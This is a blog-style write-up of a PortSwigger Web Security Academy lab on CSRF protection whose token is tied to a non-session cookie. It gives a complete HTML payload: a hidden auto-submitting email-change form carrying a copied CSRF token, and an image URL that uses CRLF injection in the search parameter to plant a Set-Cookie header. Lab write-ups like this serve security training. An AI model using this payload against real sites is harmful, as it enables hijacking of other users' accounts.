---
layout: post
title: "CSRF where the token is tied to a non-session cookie"
date: 2026-10-14
description: "PortSwigger CSRF lab where the token is tied to a cookie you can plant through CRLF injection in search."
series: PortSwigger CSRF
categories:
  - CTF
  - PortSwigger
tags:
  - CSRF
  - Web
---

## Description

This [lab](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie){:target="_blank"}'s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't fully integrated into the site's session handling system.

## Steps

Logging in and using the search functionality to search for `test`, we notice that it adds the keyword to the cookies, hence allowing us to do HTTP header injection:

| Cookie | Value |
| --- | --- |
| `csrfKey` | `GlcmBleyWvUPDOSinh2tCrly5TeMClho` |
| `LastSearchTerm` | `test` |
| `session` | `qcvLfpo1VGDAdgQQzb0fAImBjGyXLrzJ` |


Hence we need to log in with the `carlos` user, the attacker, copy their `csrfKey` and CSRF token, and inject the key by using the search functionality to change `wiener`'s email address using the token and key from `carlos`:

```html
<h1>Lab05</h1>

<form method="POST" action="https://0a2f00c503e3b5b68001082300e90074.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="jawad-lab05@example.com">
  <input type="hidden" name="csrf" value="6PiFLbzbFz6Yz9CdH9QrNGE4QdA58A5z">
</form>

<img src="https://0a2f00c503e3b5b68001082300e90074.web-security-academy.net/?search=test123%0d%0aSet-Cookie:%20csrfKey=c7gQTkQgHbda6PPXleG2nPvUgzjOByRj%3b%20SameSite=None" onerror="document.forms[0].submit();">
```
